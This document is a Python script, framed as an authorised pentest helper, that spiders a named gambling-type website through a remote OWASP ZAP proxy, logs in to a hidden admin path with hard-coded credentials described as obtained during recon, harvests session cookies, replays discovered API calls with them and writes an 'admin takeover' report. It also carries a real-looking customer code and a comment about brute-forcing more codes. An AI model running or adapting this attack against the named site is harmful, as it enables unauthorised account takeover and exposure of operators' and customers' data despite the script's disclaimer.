#!/usr/bin/env python3
"""
Automated penetration-testing helper script that
  * Connects through an existing OWASP ZAP instance (running in daemon mode)
  * Spiders the target to enumerate endpoints (focussing on /api/ paths)
  * Attempts to log-in to the hidden admin portal using supplied credentials
  * Replays discovered API calls with the authenticated session / cookies
  * Records results, potential information disclosure, and produces a report

IMPORTANT
---------
This script is **for educational / authorised testing only**.
Make sure you have explicit permission to test the target.
"""

import base64
import json
import os
import re
import subprocess
import sys
import time
from collections import defaultdict
from typing import Dict, List, Optional, Tuple
from urllib.parse import urljoin, urlparse

import requests
from bs4 import BeautifulSoup

# ---------------------------------------------------------------------------
# Global configuration – change to match your engagement
# ---------------------------------------------------------------------------
TARGET_URL = "https://pigslot.co/"
CUSTOMER_CODES = [
    "PS663888386",  # known working customer code
    # "PS000000001",  # <-- add more potential codes to brute-force / test
]
ADMIN_PANEL_PATH = "/admin-force"  # discovered hidden path
ADMIN_LOGIN_URL = urljoin(TARGET_URL, ADMIN_PANEL_PATH)

# Credentials obtained during recon
ADMIN_USERNAME = "0960422161"
ADMIN_PASSWORD = "181242"

# Where we persist output / evidence
OUTPUT_DIR = "admin_breach_results"

# ZAP daemon details (already running on a remote VPS)
ZAP_HOST = "46.202.177.106"
ZAP_PORT = 8080
ZAP_API_KEY = "YourSecureApiKey123"
ZAP_API_BASE = f"http://{ZAP_HOST}:{ZAP_PORT}"

# Proxy dictionary for *target traffic* (not for ZAP API calls)
PROXIES = {
    "http": f"http://{ZAP_HOST}:{ZAP_PORT}",
    "https": f"http://{ZAP_HOST}:{ZAP_PORT}",
}

# ---------------------------------------------------------------------------
# Static endpoints provided from manual intelligence / ZAP observation
# Use {customer_code} placeholder where appropriate so we can iterate
# ---------------------------------------------------------------------------

STATIC_API_ENDPOINTS = [
    "https://jklmn23456.com/api/v1/loyalty/{customer_code}/vip/status",
    "https://jklmn23456.com/api/v1/loyalty/chat/token/guest",
    "https://jklmn23456.com/api/v1/loyalty/chat/swear-word",
    "https://api.bcdef45678.com/api/v1/feature-toggle/system-status",
    "https://jklmn23456.com/api/v1/game/brand/",
    "https://jklmn23456.com/api/v1/promotions/",
    "https://jklmn23456.com/api/v1/campaigns/",
]

# ---------------------------------------------------------------------------
# Helper utilities
# ---------------------------------------------------------------------------

def _c(msg: str, colour: str) -> str:
    """Return coloured terminal string."""
    colours = {
        "blue": "\033[1;34m",
        "green": "\033[1;32m",
        "yellow": "\033[1;33m",
        "red": "\033[1;31m",
        "reset": "\033[0m",
    }
    return f"{colours[colour]}{msg}{colours['reset']}"

def info(msg: str):
    print(_c(f"[+] {msg}", "blue"))

def success(msg: str):
    print(_c(f"[+] {msg}", "green"))

def warn(msg: str):
    print(_c(f"[!] {msg}", "yellow"))

def error(msg: str):
    print(_c(f"[-] {msg}", "red"))

def save_artifact(filename: str, content: str):
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    fpath = os.path.join(OUTPUT_DIR, filename)
    with open(fpath, "w", encoding="utf-8") as fp:
        fp.write(content)
    success(f"Saved ⇒ {fpath}")

# ---------------------------------------------------------------------------
# Dependency bootstrap (requests / bs4 may not be installed on the target VM)
# ---------------------------------------------------------------------------

def _ensure_deps():
    pkgs = {"requests": "requests", "bs4": "beautifulsoup4"}
    for imp, pkg in pkgs.items():
        try:
            __import__(imp)
        except ImportError:
            warn(f"Missing dependency '{pkg}', attempting installation…")
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install", "--quiet", "--user", pkg])
            except subprocess.CalledProcessError:
                error(f"Failed to install '{pkg}'. Exiting.")
                sys.exit(1)

_ensure_deps()

# Disable insecure-request warnings (self-signed during intercept)
import urllib3  # noqa: E402  pylint: disable=wrong-import-position
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ---------------------------------------------------------------------------
# ZAP API helpers
# ---------------------------------------------------------------------------

def zap_api_call(component: str, sub: str, action: str, params: Optional[Dict] = None) -> dict:
    """Generic helper around the ZAP JSON API."""
    if params is None:
        params = {}
    params.update({"apikey": ZAP_API_KEY})
    url = f"{ZAP_API_BASE}/{sub}/{component}/{action}/"
    try:
        r = requests.get(url, params=params, timeout=30)
        r.raise_for_status()
        return r.json()
    except Exception as exc:
        error(f"ZAP API error on {component}/{action}: {exc}")
        return {}

# ---------------------------------------------------------------------------
# 1. Spider / crawl target to collect endpoints
# ---------------------------------------------------------------------------

def zap_spider(target: str) -> List[str]:
    info(f"Launching ZAP spider against {target}")
    scan = zap_api_call("spider", "action", "scan", {"url": target, "recurse": "true", "maxChildren": 0})
    scan_id = scan.get("scan")
    if not scan_id:
        error("Spider failed to start – check ZAP daemon & API key")
        return []
    # Poll status
    while True:
        status = zap_api_call("spider", "view", "status", {"scanId": scan_id}).get("status", 0)
        info(f"  spider progress: {status}%")
        if status == "100":
            break
        time.sleep(2)
    # Retrieve URLs
    urls = zap_api_call("core", "view", "urls").get("urls", [])
    success(f"Spider completed – {len(urls)} URLs collected")
    return urls

# ---------------------------------------------------------------------------
# 2. Intelligent endpoint selection (focus on /api/ + potential admin keywords)
# ---------------------------------------------------------------------------

def filter_api_endpoints(urls: List[str]) -> List[str]:
    api_candidates = []
    patterns = [r"/api/", r"admin", r"user", r"loyalty", r"vip"]
    for u in urls:
        if any(p in u for p in patterns):
            api_candidates.append(u)
    # de-duplicate while preserving order
    seen = set()
    uniq = [x for x in api_candidates if not (x in seen or seen.add(x))]
    success(f"Identified {len(uniq)} candidate API endpoints from spider crawl")
    return uniq

# ---------------------------------------------------------------------------
# 3. Perform login to the hidden admin panel
# ---------------------------------------------------------------------------

def try_admin_login() -> Tuple[Optional[Dict], requests.Session]:
    info(f"Attempting credential-stuffing against {ADMIN_LOGIN_URL}")
    sess = requests.Session()
    sess.proxies = PROXIES
    sess.verify = False
    sess.headers.update({
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120 Safari/537.36",
    })

    # Step-1 grab login page to harvest possible CSRF tokens & field names
    r = sess.get(ADMIN_LOGIN_URL, timeout=15)
    r.raise_for_status()
    soup = BeautifulSoup(r.text, "lxml")

    # Heuristically locate username / password field names (fallback defaults)
    uname_field = None
    pwd_field = None
    for inp in soup.find_all("input"):
        n = inp.get("name", "").lower()
        if not uname_field and re.search(r"user|phone", n):
            uname_field = inp.get("name")
        if not pwd_field and "pass" in n:
            pwd_field = inp.get("name")
    uname_field = uname_field or "username"
    pwd_field = pwd_field or "password"

    payload: Dict[str, str] = {uname_field: ADMIN_USERNAME, pwd_field: ADMIN_PASSWORD}

    # append CSRF token(s) if present
    for token_name in ["csrf_token", "authenticity_token", "token", "nonce"]:
        token_input = soup.find("input", {"name": token_name})
        if token_input and token_input.get("value"):
            payload[token_name] = token_input["value"]
    # Some portals also expect customer_code – include opportunistically
    payload.setdefault("customer_code", CUSTOMER_CODES[0]) # Use the first customer code for login

    # Submit credentials (no redirect follow to inspect status code + location)
    resp = sess.post(ADMIN_LOGIN_URL, data=payload, allow_redirects=False, timeout=15)

    if resp.status_code in (302, 301):
        success("Received redirect after login ⇒ likely success")
    elif resp.status_code == 200 and ("dashboard" in resp.text.lower() or "welcome" in resp.text.lower()):
        success("Login appears successful (keyword heuristics)")
    else:
        warn(f"Login unsuccessful – status {resp.status_code}")
        return None, sess

    success(f"Authenticated. Cookies: {sess.cookies.get_dict()}")
    return sess.cookies.get_dict(), sess

# ---------------------------------------------------------------------------
# 4. Endpoint probing using authenticated session
# ---------------------------------------------------------------------------

def probe_endpoints(session: requests.Session, endpoints: List[str]) -> Dict[str, dict]:
    results: Dict[str, dict] = {}
    for ep in endpoints:
        print(f"  ↳ probing {ep[:100]}…", end="\r")
        try:
            r = session.get(ep, timeout=15)
            status = r.status_code
            entry = {"status": status}
            if status == 200:
                try:
                    entry["data"] = r.json()
                except Exception:
                    entry["raw"] = r.text[:500]
            results[ep] = entry
        except Exception as exc:
            results[ep] = {"error": str(exc)}
    print(" " * 80, end="\r")
    success(f"Finished probing {len(endpoints)} endpoints")
    return results

# ---------------------------------------------------------------------------
# 5. Simple JWT inspection / manipulation helper (offline)
# ---------------------------------------------------------------------------

def decode_jwt(token: str) -> dict:
    """Decode (but not verify) a JWT payload for inspection."""
    try:
        payload_b64 = token.split(".")[1]
        # pad base64
        payload_b64 += "=" * (-len(payload_b64) % 4)
        decoded = base64.urlsafe_b64decode(payload_b64)
        return json.loads(decoded)
    except Exception:
        return {}

# ---------------------------------------------------------------------------
# 6. Report generator
# ---------------------------------------------------------------------------

def generate_report(spider_urls: List[str], api_endpoints: List[str], probe_results: Dict[str, dict], cookies: Optional[Dict]):
    lines = []
    lines.append("=" * 70)
    lines.append("AUTOMATED ADMIN-TAKEOVER PENTEST REPORT")
    lines.append(f"Target: {TARGET_URL}")
    lines.append(f"Generated: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")

    if cookies:
        lines.append("[+] Successful authentication – session cookies obtained:\n")
        lines.append(json.dumps(cookies, indent=2))
    else:
        lines.append("[!] Authentication FAILED – subsequent API probes unauthenticated.\n")

    lines.append("\n--- Discovered endpoints (filtered) ---\n")
    for ep in api_endpoints:
        lines.append(ep)

    lines.append("\n--- Endpoint probe results ---\n")
    for ep, res in probe_results.items():
        lines.append(f"{ep} ⇒ {json.dumps(res)[:200]}")

    lines.append("\nEnd of report\n" + "=" * 70)
    report_text = "\n".join(lines)
    save_artifact("FINAL_ADMIN_TAKEOVER_REPORT.txt", report_text)

# ---------------------------------------------------------------------------
# Main orchestration
# ---------------------------------------------------------------------------

def main():
    info("Starting automated engagement – all traffic will route through ZAP proxy")

    # 1. Spider target
    spider_urls = zap_spider(TARGET_URL)

    # 2. Extract API-looking endpoints
    api_endpoints = filter_api_endpoints(spider_urls)

    # 2b. Append intelligence-based static endpoints (expand placeholders)
    static_expanded: List[str] = []
    for template in STATIC_API_ENDPOINTS:
        if "{customer_code}" in template:
            for code in CUSTOMER_CODES:
                static_expanded.append(template.format(customer_code=code))
        else:
            static_expanded.append(template)

    api_endpoints.extend(static_expanded)
    # de-duplicate while preserving order
    seen = set()
    api_endpoints = [x for x in api_endpoints if not (x in seen or seen.add(x))]

    # 3. Attempt admin login
    cookies, session = try_admin_login()
    if not cookies:
        warn("Proceeding with unauthenticated session – results may be limited")
    else:
        session.cookies.update(cookies)

    # 4. Probe all filtered endpoints (and ensure duplicates removed)
    probe_results = probe_endpoints(session, api_endpoints)

    # 5. Output consolidated report
    generate_report(spider_urls, api_endpoints, probe_results, cookies)

    success("Script completed – review the generated report and raw artefacts")


if __name__ == "__main__":
    main()